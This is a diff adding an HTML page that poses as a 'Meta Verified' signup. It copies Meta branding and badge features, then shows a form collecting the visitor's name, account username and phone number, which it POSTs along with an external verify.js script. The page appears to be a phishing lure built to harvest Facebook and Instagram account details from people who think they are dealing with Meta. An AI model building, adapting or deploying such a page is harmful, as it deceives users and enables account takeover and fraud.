@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="stuff/images/mata.ico" type="image/x-icon">
+    <title>Meta Verification</title>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo img {
+            height: 60px;
+            margin-bottom: 20px;
+        }
+
+        .header {
+            color: #333;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .sub-header {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .features {
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            text-align: left;
+        }
+
+        ul li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        ul li img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .error {
+            color: red;
+            font-weight: bold;
+            display: none; /* Hide the error message by default */
+        }
+
+        .button {
+            display: inline-block;
+            background-color: #007bff;
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        .button:hover {
+            background-color: #0056b3;
+        }
+
+        form {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .form-field {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            text-align: left;
+        }
+
+        .form-field label {
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .form-field input {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+
+        .back-button {
+            margin-top: 20px;
+            text-decoration: none;
+            color: #007bff;
+            font-size: 12px;
+        }
+
+        .back-button:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <div id="step1">
+            <div class="header">Meta Verified</div>
+            <div class="logo">
+                <img src="stuff/icons/blue-tick.png" alt="Meta Logo">
+            </div>
+        
+            <div class="header">Build customer confidence with Meta Verified</div>
+            <p>Get a verified badge, Instagram and Facebook, plus priority support and advanced features to support your journey.</p>
+            <br>
+            <ul>
+                <li><img src="stuff/icons/black tick.png" alt="Verified Badge Icon"> Verified badge: Build trust by showing your business is authentic.</li>
+                <br>
+                <li><img src="stuff/icons/lock1.png" alt="Multi-Device Icon"> Proactive protection:
+                    Avoid impersonation with active account monitoring.</li>
+                    <br>
+                <li ><img src="stuff/icons/eye.png" alt="Increased Reach" style="width: 20px; height: 20px; margin-right: 10px;" > Increased Reach: Expand your visibility in comments and recommendations.</li>
+                <br>
+                <li><img src="stuff/icons/men.png" alt="Priority Support Icon"> Priority support: Get help fast to solve your issues.</li>
+            </ul>
+            <a href="#" class="button" onclick="showForm()">Next</a>
+        </div>
+
+        
+        <form id="step2" method="POST">
+            <div class="header">Meta Verified</div>
+            <div class="logo">
+                <img src="stuff/icons/blue-tick.png" alt="Meta Logo" >
+            </div>
+            <div class="header">Build customer confidence with Meta Verified</div>
+            <p>Get a verified badge, Instagram and Facebook, plus priority support and advanced features to support your journey.</p>
+            <div class="form-field">
+                <label for="legal-name">Name:</label>
+                <input type="text" name="legal-name" id="legal-name" placeholder="Enter your name" pattern="[a-zA-Z\s]+" title="Name should only contain letters and spaces" required>
+
+                <label for="legal-name">username:</label>
+                <input type="text" name="username" id="legal-name" placeholder="Enter the username" pattern="[a-zA-Z0-9]+" title="username should only contain letters and numbers" required>
+            </div>
+            <div class="form-field">
+                <label for="phone-number">Phone Number:</label>
+                <input type="text" name="phone-number" id="phone-number" placeholder="Enter your phone number" pattern="[0-9\s-]+" title="Phone number should only contain Numbers" required>
+            </div>
+            <button class="button" type="submit" >Submit</button>
+
+        
+            <a href="#" class="back-button" onclick="showInfo()">Back</a>
+        </form>
+    </div>
+
+    <script>
+        function showForm() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'flex';
+        }
+
+        function showInfo() {
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('step2').style.display = 'none';
+        }
+     
+    </script>
+    <script src="js/verify.js"></script>
+</body>
+</html>
